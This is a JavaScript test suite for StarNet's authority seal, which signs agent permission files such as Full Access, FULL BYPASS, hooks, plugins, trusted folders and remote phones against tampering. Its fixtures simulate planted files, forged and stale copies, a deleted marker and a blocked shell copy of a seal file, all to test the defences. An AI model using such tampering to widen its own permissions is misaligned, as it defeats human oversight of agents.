    const roster1 = { version: 1, updatedAt: 4500, agents: [
      { agentId: 'a', name: 'NOVA PRIME', approvalMode: 'full', executionProfile: 'this-computer' },   // renamed; profile widened
      { agentId: 'b', name: 'ORBIT', approvalMode: 'full', executionProfile: 'safe-cell' },            // raised; narrowed to Safe Cell
      { agentId: 'c', name: 'NEW', approvalMode: 'full' },                                              // new, full
      { agentId: 'd', name: 'DUSK', approvalMode: 'ask', executionProfile: 'this-computer' }] };       // lowered
    d.files['agent.roster.json'] = roundTrip(bare.seal('agent.roster.json', roster1));
    A.ok(d.last['agent.roster.json'] && d.last['agent.roster.json'][S.FIELD], 'before overwriting, the unkeyed StarNet kept the sealed copy');
    const firstCopy = JSON.stringify(d.last['agent.roster.json']);
    d.files['agent.roster.json'] = roundTrip(bare.seal('agent.roster.json', Object.assign({}, roster1, { updatedAt: 4600 })));
    A.eq(JSON.stringify(d.last['agent.roster.json']), firstCopy, 'a second unsealed save keeps the sealed copy it had (never an unsealed one)');
    d.files['permissions.bypass.json'] = roundTrip(bare.seal('permissions.bypass.json', { version: 1, on: false, setAt: 2 }));
    d.files['hooks.json'] = roundTrip(bare.seal('hooks.json', { hooks: [{ event: 'pre', command: 'node a.js' }, { event: 'pre', command: 'node new.js' }] }));
    d.files['hooks-allowed.json'] = roundTrip(bare.seal('hooks-allowed.json', { 'pre\u0000node a.js': { event: 'pre', command: 'node a.js' }, 'pre\u0000node new.js': { event: 'pre', command: 'node new.js' } }));
    d.files['plugins-allowed.json'] = roundTrip(bare.seal('plugins-allowed.json', { p1: { digest: 'aaa' }, p2: { digest: 'CHANGED' }, p3: { digest: 'ccc' } }));
    A.ok(S.LEGACY_NAMES.every(n => !(S.FIELD in d.files[n])), 'the unkeyed StarNet wrote all five unsealed');
    // the app's next keyed boot
    const back = d.station(KEY);
    const r = back.boot(d.list);
    A.eq(r.mode, 'enforce', 'a valid marker: enforce');
    A.eq(r.reconciled.slice().sort(), S.LEGACY_NAMES.slice().sort(), 'every file the unkeyed StarNet saved is reconciled');
    A.ok(S.LEGACY_NAMES.every(n => back.open(n, d.files[n]).ok), 'and written back sealed: each opens');
    A.eq(Object.keys(d.last), [], 'the sealed copies are spent');
    const roster = back.open('agent.roster.json', d.files['agent.roster.json']).value;
    const row = id => roster.agents.find(x => x.agentId === id);
    A.eq(row('a'), { agentId: 'a', name: 'NOVA PRIME', approvalMode: 'full' }, 'NOVA keeps the Full Access it had sealed and its rename; the wider profile is not taken');
    A.eq(row('b'), { agentId: 'b', name: 'ORBIT', approvalMode: 'ask', executionProfile: 'safe-cell' }, 'ORBIT\'s raise is not taken; its move into the Safe Cell is');
    A.eq(row('c'), { agentId: 'c', name: 'NEW', approvalMode: 'ask' }, 'a new agent is kept, asking first');
    A.eq(row('d'), { agentId: 'd', name: 'DUSK', approvalMode: 'ask', executionProfile: 'this-computer' }, 'a lowering is kept (DUSK asks first), with the profile it had sealed');
    A.eq(roster.updatedAt, 4600, 'the unkeyed StarNet\'s own (past) freshness stamp is kept');
    A.eq(back.open('permissions.bypass.json', d.files['permissions.bypass.json']).value.on, false, 'FULL BYPASS turned off there stays off');
    A.eq(back.open('hooks.json', d.files['hooks.json']).value.hooks, [{ event: 'pre', command: 'node a.js' }], 'a removed hook stays removed; an added one is not loaded');
    A.eq(Object.keys(back.open('hooks-allowed.json', d.files['hooks-allowed.json']).value), ['pre\u0000node a.js'], 'an added hook approval is not used');
    A.eq(back.open('plugins-allowed.json', d.files['plugins-allowed.json']).value, { p1: { digest: 'aaa' } }, 'a plugin approved there, or approved at another digest, waits again');
    const rn = back.notices().find(n => n.kind === 'reconciled' && n.name === 'agent.roster.json');
    A.ok(rn && /could not seal it/.test(rn.text) && /Full Access for "ORBIT"/.test(rn.text) && /Full Access for "NEW"/.test(rn.text) && /this-computer/.test(rn.text), 'the notice names what was not taken (' + (rn && rn.text) + ')');
    A.ok(!back.notices().some(n => n.kind === 'unsealed' || n.kind === 'mismatch'), 'nothing reads as "changed outside StarNet"');
    const bn = back.notices().find(n => n.kind === 'reconciled' && n.name === 'permissions.bypass.json');
    A.ok(bn && /kept as it is/.test(bn.text), 'a change that only took power away is simply kept');
    // a later keyed boot has nothing to do
    A.eq(d.station(KEY).boot(d.list).reconciled, [], 'reconciled once');
  }
  {
    // a raise made without the key: FULL BYPASS on is not taken
    const d = shared();
    const app = d.station(KEY);
    d.files['permissions.bypass.json'] = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: false }));
    const bare = d.station(null); bare.boot(d.list);
    d.files['permissions.bypass.json'] = roundTrip(bare.seal('permissions.bypass.json', { version: 1, on: true }));
    const back = d.station(KEY); back.boot(d.list);
    A.eq(back.open('permissions.bypass.json', d.files['permissions.bypass.json']).value.on, false, 'FULL BYPASS turned on without the key stays off');
    A.ok(back.notices().some(n => n.kind === 'reconciled' && /FULL BYPASS on/.test(n.text)), 'and the notice says so');
  }
  {
    // what a process without the key can do: no sealed copy, a forged copy, a foreign copy, a future stamp
    const d = shared();
    const app = d.station(KEY);
    d.files['permissions.bypass.json'] = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: false }));
    d.files['hooks-allowed.json'] = { evil: { event: 'pre', command: 'evil' } };                                   // planted, no copy
    d.last['permissions.bypass.json'] = { version: 1, on: true, [S.FIELD]: { v: 1, mac: 'a'.repeat(64) } };         // forged copy
    d.files['permissions.bypass.json'] = { version: 1, on: true };
    d.last['agent.roster.json'] = roundTrip(S.makeAuthoritySeal({ key: OTHER, marker: memMarker() }).seal('agent.roster.json', { version: 1, agents: [{ agentId: 'x', approvalMode: 'full' }] }));
    d.files['agent.roster.json'] = { version: 1, agents: [{ agentId: 'x', approvalMode: 'full' }] };
    const back = d.station(KEY);
    A.eq(back.boot(d.list).reconciled, [], 'a forged or foreign sealed copy caps nothing');
    A.eq(back.open('permissions.bypass.json', d.files['permissions.bypass.json']).why, 'unsealed', 'so the planted FULL BYPASS is refused as before');
    A.eq(back.open('hooks-allowed.json', d.files['hooks-allowed.json']).why, 'unsealed', 'a planted file with no sealed copy is refused as before');
    A.eq(back.open('agent.roster.json', d.files['agent.roster.json']).why, 'unsealed', 'a roster capped by another key\'s copy is refused');
    // a sealed copy beside a file that is whole again is spent, and changes nothing
    const d2 = shared();
    const a2 = d2.station(KEY);
    d2.files['permissions.bypass.json'] = roundTrip(a2.seal('permissions.bypass.json', { version: 1, on: false }));
    d2.last['permissions.bypass.json'] = roundTrip(a2.seal('permissions.bypass.json', { version: 1, on: true }));
    const b2 = d2.station(KEY);
    A.eq(b2.boot(d2.list).reconciled, [], 'a sealed file is not reconciled');
    A.ok(!d2.last['permissions.bypass.json'], 'its stale copy is dropped');
    A.eq(b2.open('permissions.bypass.json', d2.files['permissions.bypass.json']).value.on, false, 'and the sealed file stands');
    const low = S.lowerOf('agent.roster.json', { version: 1, updatedAt: 9e15, agents: [] }, { agents: [] }, 5000);
    A.ok(!('updatedAt' in low.value), 'a stamp from the future is not taken');
    A.eq(S.lowerOf('cron.jobs.json', {}, {}, 1), null, 'a file with no rule is never reconciled');
  }
  {
    // a station with no key over a workspace nobody sealed: as before, said once in the log, never a refusal
    const d = shared();
    const logged = [];
    const bare = S.makeAuthoritySeal({ key: null, now: () => 1, marker: d.mk, lastSealed: { read: () => undefined, write: () => { throw new Error('no copy expected'); } }, current: () => ({ [S.FIELD]: { v: 1 } }), log: l => logged.push(l) });
    A.eq(bare.boot(d.list).mode, 'unkeyed', 'a bare station is unkeyed');
    A.ok(logged.some(l => /not sealed/.test(l)), 'its log says the files are not sealed');
    A.eq(bare.notices().length, 0, 'and the page gets no toast on every boot');
    const v = { version: 1, agents: [{ agentId: 'a', approvalMode: 'full' }] };
    A.ok(bare.seal('agent.roster.json', v) === v, 'it writes what it always wrote (and keeps no copy: nothing was sealed)');
    A.ok(bare.open('agent.roster.json', v).ok, 'and reads its own files back');
  }
  {
    // the wiring: index.js hands the seal the .sealed-last store and the on-disk reader; the page says "not sealed"
    A.ok(/lastSealed: \{\s*read: \(name\) => readJsonIfPresent\(authoritySealLastFile\(name\)\)/.test(IDX), 'index.js gives the seal its .sealed-last store');
    A.ok(/current: \(name\) => readJsonIfPresent\(authorityFileOf\(name\)\)/.test(IDX), 'and the on-disk reader');
    A.ok(/evidence: \(\) => \{[\s\S]{0,400}authorityFileOf\(name\) \+ '\.bak', authoritySealLastFile\(name\)\);[\s\S]{0,200}'cron\.jobs\.json\.bak'/.test(IDX), 'and each file\'s .bak and .sealed-last copy, and the routine store, as traces of sealing (review 4c)');
    const st = read('frontend/app/stationui.js');
    A.ok(/snap\.loaded && snap\.sealed === false \? '<p class="pg-floor pg-unsealed">/.test(st), 'the Permissions glance says when the files are not sealed');
    global.Permissions = require('../frontend/app/permissions.js');
    const { PermissionsStore } = require('../frontend/app/permissionsstore.js');
    for (const [seal, want] of [[{ keyed: false }, false], [{ keyed: true }, true], [undefined, null]]) {
      PermissionsStore.init({ api: { load: async () => ({ grants: [], grantable: [], authoritySeal: seal }) }, getPosture: () => ({}), applyPreset: () => {}, load: false });
      A.eq((await PermissionsStore.refresh()).sealed, want, 'the store carries authoritySeal.keyed as sealed (' + JSON.stringify(seal) + ')');
    }
    const Shell = require('../sidecar/tools/builtin/shell.js');
    A.ok(Shell.escapesWorkspace('copy x agent.roster.json.sealed-last'), 'the shell floor covers the sealed copies too');
  }

  // ---- 9. review 4b (fix-sec2): an older sealed copy is not the current one ----
  {
    let t = 10000;
    const mk = memMarker();
    const app = S.makeAuthoritySeal({ key: KEY, now: () => t, marker: mk });
    const on = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: true, setAt: 1 }));
    A.ok(Number.isSafeInteger(on[S.FIELD].g) && on[S.FIELD].g >= 10000, 'a seal carries its generation');
    A.ok(app.open('permissions.bypass.json', on).ok, 'and opens');
    const forged = Object.assign({}, on, { [S.FIELD]: Object.assign({}, on[S.FIELD], { g: on[S.FIELD].g + 5 }) });
    A.eq(app.open('permissions.bypass.json', forged).why, 'mismatch', 'the generation is bound into the MAC (moving it breaks the seal)');
    A.eq(app.open('permissions.bypass.json', Object.assign({}, on, { [S.FIELD]: Object.assign({}, on[S.FIELD], { g: 1.5 }) })).why, 'mismatch', 'a generation that is not a whole number is refused');
    const writesBefore = mk.writes;
    t = 10001;
    const off = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: false, setAt: 2 }));   // FULL BYPASS switched off
    A.ok(mk.writes > writesBefore && mk.value.floors['permissions.bypass.json'] === off[S.FIELD].g, 'switching FULL BYPASS off moves its floor in the sealed marker');
    A.ok(app.open('permissions.bypass.json', off).ok, 'the current file opens');
    const stale = app.open('permissions.bypass.json', on);   // the .bak (the main before the last write), copied back
    A.eq(stale.why, 'stale', 'the older sealed { on: true } (its .bak, put back) is refused: stale');
    A.ok(app.notices().some(n => n.kind === 'stale' && /older copy than the last change that took power away/.test(n.text) && /FULL BYPASS is off/.test(n.text)), 'the page is told it was an older copy put back');
    // a later station reads the floor from the marker: the same copy stays refused after a restart (or a recovery from .bak)
    const next = S.makeAuthoritySeal({ key: KEY, now: () => 20000, marker: mk });
    const files = { 'permissions.bypass.json': off };
    A.eq(next.boot([{ name: 'permissions.bypass.json', read: () => files['permissions.bypass.json'], write: v => { files['permissions.bypass.json'] = roundTrip(v); } }]).mode, 'enforce', 'the next boot enforces');
    A.eq(next.open('permissions.bypass.json', on).why, 'stale', 'after a restart the old copy is still refused (the floor is in the marker)');
    A.ok(next.open('permissions.bypass.json', off).ok, 'and the current one opens');
    // adding power does not move the floor: the .bak of a raise is the older, lower file, and still opens (torn-write recovery)
    const floorBefore = mk.value.floors['permissions.bypass.json'];
    const onAgain = roundTrip(next.seal('permissions.bypass.json', { version: 1, on: true, setAt: 3 }));
    A.eq(mk.value.floors['permissions.bypass.json'], floorBefore, 'a raise does not move the floor');
    A.ok(next.open('permissions.bypass.json', off).ok && next.open('permissions.bypass.json', onAgain).ok, 'so the .bak of a raise (lower than the file) still opens');
    A.ok(onAgain[S.FIELD].g > off[S.FIELD].g, 'and a new generation is above every one the station saw, whatever the clock says');
  }
  {
    // the roster: an agent lowered, then its older copy put back
    const mk = memMarker();
    const app = S.makeAuthoritySeal({ key: KEY, now: () => 500, marker: mk });
    const full = roundTrip(app.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'full' }, { agentId: 'b', name: 'ORBIT', approvalMode: 'ask' }] }));
    const renamed = roundTrip(app.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA 2', approvalMode: 'full' }, { agentId: 'b', name: 'ORBIT', approvalMode: 'ask' }] }));
    A.ok(app.open('agent.roster.json', full).ok, 'a rename moves no floor: the copy before it still opens');
    const lowered = roundTrip(app.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA 2', approvalMode: 'ask' }, { agentId: 'b', name: 'ORBIT', approvalMode: 'ask' }] }));
    A.eq(app.open('agent.roster.json', renamed).why, 'stale', 'after NOVA loses Full Access, the copy where it had it is stale');
    A.eq(app.open('agent.roster.json', full).why, 'stale', 'and so is every copy before that');
    A.ok(app.open('agent.roster.json', lowered).ok, 'the lowered roster opens');
    const removed = roundTrip(app.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'b', name: 'ORBIT', approvalMode: 'ask' }] }));
    A.ok(app.open('agent.roster.json', removed).ok, 'removing an agent seals');
    for (const [name, a, b] of [
      ['hooks.json', { hooks: [{ event: 'pre', command: 'x' }] }, { hooks: [] }],
      ['hooks-allowed.json', { k: { event: 'pre', command: 'x' } }, {}],
      ['plugins-allowed.json', { p: { digest: 'd' } }, {}]]) {
      const first = roundTrip(app.seal(name, a));
      app.seal(name, b);
      A.eq(app.open(name, first).why, 'stale', 'taking away in ' + name + ' leaves the earlier copy stale');
    }
  }
  {
    // the floor is written before the file: a marker that cannot be written refuses the lowering; a crash in between
    // leaves the file under its floor (its safe default), never the power being taken away
    let fail = false;
    const mk = memMarker();
    const failing = { read: () => mk.read(), write: v => { if (fail) throw Object.assign(new Error('disk full'), { code: 'ENOSPC' }); mk.write(v); } };
    const app = S.makeAuthoritySeal({ key: KEY, now: () => 100, marker: failing });
    const on = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: true }));
    fail = true;
    let threw = null;
    try { app.seal('permissions.bypass.json', { version: 1, on: false }); } catch (e) { threw = e; }
    A.ok(threw && /could not record this change in authority-seal\.json \(ENOSPC\), so it was not saved/.test(threw.message), 'a lowering whose floor cannot be recorded is refused with a plain message (' + (threw && threw.message) + ')');
    A.ok(app.open('permissions.bypass.json', on).ok, 'and the floor did not move (nothing changed)');
    A.ok(app.seal('permissions.bypass.json', { version: 1, on: true, setAt: 9 }), 'a write that takes nothing away needs no marker write');
    fail = false;
    app.seal('permissions.bypass.json', { version: 1, on: false });   // floor recorded ... and then the process dies before the file is written
    const after = S.makeAuthoritySeal({ key: KEY, now: () => 200, marker: mk });
    after.boot([{ name: 'permissions.bypass.json', read: () => on, write: () => {} }]);
    A.eq(after.open('permissions.bypass.json', on).why, 'stale', 'a crash between the floor and the file: the old file reads as its default (FULL BYPASS off)');
  }
  {
    // the first seals (no generation) and the first marker (no floors) still open; a restore or a sealed copy under the
    // floor is not taken as current; a station whose clock went back still seals above what is on disk
    const legacyMac = (name, body) => require('crypto').createHmac('sha256', KEY).update('v1\n' + name + '\n' + S.canonical(body)).digest('hex');
    const body = { version: 1, on: false };
    const legacy = Object.assign({}, body, { [S.FIELD]: { v: 1, mac: legacyMac('permissions.bypass.json', body) } });
    const mBody = { version: 1, sealedAt: 1 };
    const mk = memMarker();
    mk.value = Object.assign({}, mBody, { [S.FIELD]: { v: 1, mac: legacyMac(S.MARKER_NAME, mBody) } });
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 50, marker: mk });
    const disk = { 'permissions.bypass.json': legacy, 'agent.roster.json': undefined };
    const fl = Object.keys(disk).map(name => ({ name, read: () => disk[name], write: v => { disk[name] = roundTrip(v); } }));
    A.eq(st.boot(fl).mode, 'enforce', 'a marker from before generations still verifies');
    A.ok(st.open('permissions.bypass.json', legacy).ok, 'and a seal from before generations still opens (generation 0, no floor yet)');
    // clock set back: the file on disk carries a generation above the clock
    const ahead = S.makeAuthoritySeal({ key: KEY, now: () => 9e9, marker: memMarker() });
    const future = roundTrip(ahead.seal('permissions.bypass.json', { version: 1, on: true }));
    const mk2 = memMarker();
    const back = S.makeAuthoritySeal({ key: KEY, now: () => 7, marker: mk2 });
    const d2 = { 'permissions.bypass.json': future };
    back.boot([{ name: 'permissions.bypass.json', read: () => d2['permissions.bypass.json'], write: v => { d2['permissions.bypass.json'] = roundTrip(v); } }]);
    const lowered = roundTrip(back.seal('permissions.bypass.json', { version: 1, on: false }));
    A.ok(lowered[S.FIELD].g > future[S.FIELD].g, 'a station whose clock is behind still seals above the generation on disk');
    A.eq(back.open('permissions.bypass.json', future).why, 'stale', 'so the copy it lowered is stale');
    // a recovery bundle's roster sealed here, but older than the floor: adopted (clamped), not taken as current
    const mk3 = memMarker();
    const home = S.makeAuthoritySeal({ key: KEY, now: () => 300, marker: mk3 });
    const bundled = roundTrip(home.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'full' }] }));
    home.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', name: 'NOVA', approvalMode: 'ask' }] });
    const d3 = { 'agent.roster.json': bundled };
    let rec = { files: ['agent.roster.json'] };
    const restoredSt = S.makeAuthoritySeal({ key: KEY, now: () => 400, marker: mk3, restored: { read: () => rec, drop: () => { rec = undefined; } } });
    restoredSt.boot([{ name: 'agent.roster.json', read: () => d3['agent.roster.json'], write: v => { d3['agent.roster.json'] = roundTrip(v); } }]);
    const got = restoredSt.open('agent.roster.json', d3['agent.roster.json']);
    A.ok(got.ok && got.value.agents[0].approvalMode === 'ask', 'a restored roster older than the floor is adopted asking first, never taken as current');
    // a .sealed-last copy under the floor caps nothing (F1's cap is the newest copy the key approved, not any)
    const d4 = shared();
    const a4 = d4.station(KEY);
    const onCopy = roundTrip(a4.seal('permissions.bypass.json', { version: 1, on: true }));
    d4.files['permissions.bypass.json'] = roundTrip(a4.seal('permissions.bypass.json', { version: 1, on: false }));
    d4.last['permissions.bypass.json'] = onCopy;              // a process puts the old sealed copy where F1 keeps its cap
    d4.files['permissions.bypass.json'] = { version: 1, on: true };   // and writes the file unsealed
    const b4 = d4.station(KEY);
    A.eq(b4.boot(d4.list).reconciled, [], 'a stale sealed copy is no cap');
    A.eq(b4.open('permissions.bypass.json', d4.files['permissions.bypass.json']).why, 'unsealed', 'so the planted FULL BYPASS is refused');
  }

  // ---- 10. review 4c (fix-sec2): a missing marker is not a fresh install ----
  {
    // the review's chain: the marker deleted and every file's seal stripped. A sealed .bak (or .sealed-last) is a trace.
    const mk = memMarker();
    const app = S.makeAuthoritySeal({ key: KEY, now: () => 1000, marker: mk });
    const sealedBak = roundTrip(app.seal('permissions.bypass.json', { version: 1, on: false }));
    const d = disk({ 'permissions.bypass.json': { version: 1, on: true }, 'agent.roster.json': { version: 1, agents: [{ agentId: 'x', approvalMode: 'full' }] } });
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 2000, marker: memMarker(), evidence: () => [sealedBak] });
    const r = st.boot(d.list);
    A.eq(r.mode, 'enforce', 'no marker, stripped files, a sealed .bak: not an upgrade');
    A.eq(d.writes.length, 0, 'nothing is sealed as it is');
    A.eq(st.open('permissions.bypass.json', d.files['permissions.bypass.json']).why, 'unsealed', 'the stripped FULL BYPASS is refused');
    A.eq(st.open('agent.roster.json', d.files['agent.roster.json']).why, 'unsealed', 'the stripped roster is refused (every agent asks first)');
    A.eq(st.open('permissions.bypass.json', sealedBak).why, 'stale', 'and the sealed .bak, put back, does not open: the record of floors is gone');
    const n = st.notices().find(x => x.kind === 'marker-missing');
    A.ok(n && /record of what was last taken away/.test(n.text) && /none of them is used/.test(n.text), 'the page says why (' + (n && n.text) + ')');
    const st2 = S.makeAuthoritySeal({ key: KEY, now: () => 2000, marker: memMarker() });
    st2.boot(disk({ 'permissions.bypass.json': sealedBak }).list);
    st2.open('permissions.bypass.json', sealedBak);
    const sn = st2.notices().find(x => x.kind === 'stale');
    A.ok(sn && /cannot be checked against the record/.test(sn.text), 'a sealed file refused for want of the record says so, not "put back"');
    // what StarNet writes from now on opens, above the new floor
    const fresh = roundTrip(st.seal('permissions.bypass.json', { version: 1, on: true }));
    A.ok(st.open('permissions.bypass.json', fresh).ok, 'a value StarNet seals after the reset opens');
  }
  {
    // the floors after a reset sit above the clock and above every generation seen (a .sealed-last from the future)
    const ahead = S.makeAuthoritySeal({ key: KEY, now: () => 9e9, marker: memMarker() });
    const future = roundTrip(ahead.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', approvalMode: 'full' }] }));
    const d = disk({ 'agent.roster.json': future });
    const mk = memMarker();
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 10, marker: mk });
    st.boot(d.list);
    A.eq(st.open('agent.roster.json', future).why, 'stale', 'a sealed file from the future is under the reset floor');
    A.ok(mk.value && mk.value.floors['agent.roster.json'] > future[S.FIELD].g, 'the new marker records floors above it');
    // the next boot reads the new marker: still refused, and what StarNet wrote since opens
    const written = roundTrip(st.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', approvalMode: 'ask' }] }));
    const next = S.makeAuthoritySeal({ key: KEY, now: () => 20, marker: mk });
    A.eq(next.boot([{ name: 'agent.roster.json', read: () => written, write: () => {} }]).mode, 'enforce', 'the next boot verifies the new marker');
    A.eq(next.open('agent.roster.json', future).why, 'stale', 'the old copy stays refused');
    A.ok(next.open('agent.roster.json', written).ok, 'the current one opens');
  }
  {
    // a foreign or damaged marker: the same reset (no copy from before opens); an unreadable one holds the boot
    const mine = S.makeAuthoritySeal({ key: KEY, now: () => 5, marker: memMarker() });
    const sealedRoster = roundTrip(mine.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', approvalMode: 'full' }] }));
    const foreign = make(OTHER);
    foreign.seal.seal('hooks.json', { hooks: [] });
    const d = disk({ 'agent.roster.json': sealedRoster });
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 50, marker: foreign.marker });
    st.boot(d.list);
    A.eq(st.open('agent.roster.json', sealedRoster).why, 'stale', 'a foreign marker: a roster this key sealed earlier is not taken as current');
    A.ok(st.notices().some(x => x.kind === 'marker-mismatch' && /record of what was last taken away/.test(x.text)), 'and the page says why');
    const broken = S.makeAuthoritySeal({ key: KEY, now: () => 50, marker: { read: () => JSON.parse('{oops'), write: () => {} } });
    broken.boot(disk({ 'agent.roster.json': sealedRoster }).list);
    A.eq(broken.open('agent.roster.json', sealedRoster).why, 'stale', 'a damaged (unparseable) marker resets the same way');
    // unreadable (a lock): held. Readers get defaults, nothing is saved, the marker is not rewritten
    let wrote = 0;
    const lockedMk = { read: () => { throw Object.assign(new Error('busy'), { code: 'EBUSY' }); }, write: () => { wrote++; } };
    const h = S.makeAuthoritySeal({ key: KEY, now: () => 50, marker: lockedMk });
    A.eq(h.boot(disk({ 'agent.roster.json': sealedRoster }).list).mode, 'held', 'a marker that cannot be read holds the boot');
    A.eq(h.open('agent.roster.json', sealedRoster).why, 'held', 'every present file reads as its default');
    A.ok(h.open('permissions.bypass.json', undefined).ok, 'an absent one is its default anyway');
    let threw = null;
    try { h.seal('permissions.bypass.json', { version: 1, on: false }); } catch (e) { threw = e; }
    A.ok(threw && /cannot save permission changes right now/.test(threw.message) && /EBUSY/.test(threw.message) && /Restart StarNet/.test(threw.message), 'and a save is refused, saying why (' + (threw && threw.message) + ')');
    A.eq(wrote, 0, 'the record is not rewritten while it cannot be read');
    A.ok(h.held && h.notices().some(x => x.kind === 'held' && /antivirus, backup or sync/.test(x.text)), 'the page says what holds it and what to do');
  }
  {
    // the honest limit: no marker and no trace anywhere is the upgrade (the Rust side would close this; see the header)
    const d = disk({ 'permissions.bypass.json': { version: 1, on: true } });
    const st = S.makeAuthoritySeal({ key: KEY, now: () => 1, marker: memMarker(), evidence: () => [{ version: 1, on: false }, null, 'junk'] });
    A.eq(st.boot(d.list).mode, 'migrated', 'no marker and no seal anywhere StarNet looks: the one-time upgrade (unsealed copies are no trace)');
    const throwing = S.makeAuthoritySeal({ key: KEY, now: () => 1, marker: memMarker(), evidence: () => { throw new Error('EACCES'); }, log: () => {} });
    A.eq(throwing.boot(disk({ 'permissions.bypass.json': { version: 1, on: true } }).list).mode, 'migrated', 'a look that fails finds no trace (logged), as before');
    // a restore into a fresh folder: what it brought is adopted, and is no reason to refuse the rest twice
    const home = S.makeAuthoritySeal({ key: KEY, now: () => 100, marker: memMarker() });
    const files = { 'agent.roster.json': roundTrip(home.seal('agent.roster.json', { version: 1, agents: [{ agentId: 'a', approvalMode: 'full' }] })) };
    let rec = { files: ['agent.roster.json'] };
    const fl = [{ name: 'agent.roster.json', read: () => files['agent.roster.json'], write: v => { files['agent.roster.json'] = roundTrip(v); } }];
    const st2 = S.makeAuthoritySeal({ key: KEY, now: () => 200, marker: memMarker(), restored: { read: () => rec, drop: () => { rec = undefined; } } });
    st2.boot(fl);
    const got = st2.open('agent.roster.json', files['agent.roster.json']);
    A.ok(got.ok && got.value.agents[0].approvalMode === 'ask', 'restored into a folder with no marker: the roster is sealed here, asking first');
    A.ok(!st2.notices().some(x => /^marker-/.test(x.kind)), 'and that alone is not reported as a missing marker');
  }

  // ---- 11. review 4a (fix-sec2): permissions.allow.json, remote.json and the routines' grants are sealed too ----
  {
    A.eq(S.NAMES.slice(5), ['permissions.allow.json', 'remote.json', 'channel-owners.json'], 'three more whole files are sealed (final review #3 added the chat channels\' owners)');
    // final review #3: who owns each chat bot. A cap keeps only an owner (or pending pairing) it names the very same way.
    {
      const own = (o) => ({ version: 1, owners: o });
      const kept = S.lowerOf('channel-owners.json', own({ telegram: { ownerId: '111' }, 'telegramBots:b1': { ownerId: '7' } }), own({ telegram: { ownerId: '111' }, 'telegramBots:b1': { ownerId: '7' } }), 0);
      A.eq(kept.dropped, [], 'the same owners take nothing away');
      const swapped = S.lowerOf('channel-owners.json', own({ telegram: { ownerId: '666' } }), own({ telegram: { ownerId: '111' } }), 0);
      A.eq(swapped.value.owners, {}, 'an owner the cap does not name is not kept');
      A.eq(swapped.dropped.length, 1, 'and is named as dropped');
      const planted = S.lowerOf('channel-owners.json', own({ discord: { pairing: { salt: 'x', digest: 'y' } } }), own({}), 0);
      A.eq(planted.value.owners, {}, 'nor a pairing challenge the cap does not hold');
      const revoke = S.lowerOf('channel-owners.json', own({ telegram: { ownerId: '111' } }), own({}), 0);
      A.ok(revoke.dropped.length === 1, 'removing an owner takes something away (its floor moves: an older record cannot be put back)');
      const add = S.lowerOf('channel-owners.json', own({}), own({ telegram: { ownerId: '111' } }), 0);
      A.eq(add.dropped, [], 'pairing a new owner takes nothing away');
      A.ok(/pair its owner again/.test(S.CONSEQUENCE['channel-owners.json']), 'a refused record says the bot pairs its owner again');
    }
    A.eq(S.PART_NAMES, ['cron.jobs.json'], 'and the routine store in parts');
    // lowerOf: an approval or trusted folder added without the key is not taken; one removed stays removed
    const low = S.lowerOf('permissions.allow.json', { version: 1, allow: ['cabinet:write', 'path:/new', 'web:execute'], meta: { 'cabinet:write': { grantedAt: 1 }, 'path:/new': { grantedAt: 2 } } },
      { allow: ['cabinet:write', 'shell:x'] }, 1);
    A.eq(low.value.allow, ['cabinet:write'], 'only what the sealed copy held survives');
    A.eq(low.value.meta, { 'cabinet:write': { grantedAt: 1 } }, 'with its provenance');
    A.ok(low.dropped.some(d => /trusted folder \/new/.test(d)) && low.dropped.some(d => /standing permission web:execute/.test(d)), 'what was not taken is named (' + low.dropped.join('; ') + ')');
    const rl = S.lowerOf('remote.json', { v: 1, station: { id: 's' }, enabled: true, devices: [
      { id: 'd1', name: 'old', publicKey: 'K1' },                                   // approved there, asks first in the copy
      { id: 'd2', name: 'swapped', publicKey: 'EVIL' },                             // its key changed
      { id: 'd3', name: 'new', publicKey: 'K3' }] },                                // never in the sealed copy
    { enabled: false, devices: [{ id: 'd1', name: 'old', publicKey: 'K1', askFirst: true }, { id: 'd2', publicKey: 'K2' }] }, 1);
    A.eq(rl.value.enabled, false, 'remote access switched on without the key stays off');
    A.eq(rl.value.devices.map(d => [d.id, d.pending === true, d.askFirst === true]), [['d1', false, true], ['d2', true, true], ['d3', true, true]], 'a phone keeps asking first; a new or re-keyed phone waits for the desk');
    A.eq(rl.value.station, { id: 's' }, 'the station keeps its identity');
    const cr = S.clampRemote({ v: 1, station: { id: 's', privateKey: 'p' }, enabled: true, devices: [{ id: 'd', publicKey: 'k' }], [S.FIELD]: { v: 1 } });
    A.eq(cr, { v: 1, station: { id: 's', privateKey: 'p' }, enabled: false, devices: [{ id: 'd', publicKey: 'k', pending: true, askFirst: true }] }, 'a refused remote.json keeps the station, holds every phone and switches remote access off');
    // a lowering of either moves its floor
    const app = S.makeAuthoritySeal({ key: KEY, now: () => 70, marker: memMarker() });
    const two = roundTrip(app.seal('permissions.allow.json', { version: 1, allow: ['a', 'path:/p'], meta: {} }));
    app.seal('permissions.allow.json', { version: 1, allow: ['a'], meta: {} });
    A.eq(app.open('permissions.allow.json', two).why, 'stale', 'a revoked folder does not come back with an older copy');
    const phone = roundTrip(app.seal('remote.json', { v: 1, enabled: true, devices: [{ id: 'd', publicKey: 'k' }] }));
    app.seal('remote.json', { v: 1, enabled: true, devices: [] });
    A.eq(app.open('remote.json', phone).why, 'stale', 'a revoked phone does not come back with an older copy');
  }
  {
    // a workspace sealed before these existed: each is sealed once as it is; afterwards an unsealed one is refused
